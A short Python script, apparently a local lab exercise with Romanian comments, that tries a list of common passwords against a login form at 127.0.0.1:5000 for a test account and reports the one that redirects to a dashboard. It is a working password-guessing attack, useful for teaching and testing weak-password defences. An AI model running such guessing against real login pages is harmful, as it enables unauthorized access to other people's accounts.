import requests

url = "http://127.0.0.1:5000/login"
email = "weak@test.com"

# lista simplă de parole
passwords = ["admin", "123456", "password", "test", "1", "parola"]

session = requests.Session()

for password in passwords:
    response = session.post(
        url,
        data={"email": email, "password": password},
        allow_redirects=False
    )

    print(f"Incerc parola: {password} | status={response.status_code}")

    if response.status_code == 302 and "/dashboard" in response.headers.get("Location", ""):
        print(f"[+] Parola gasita: {password}")
        break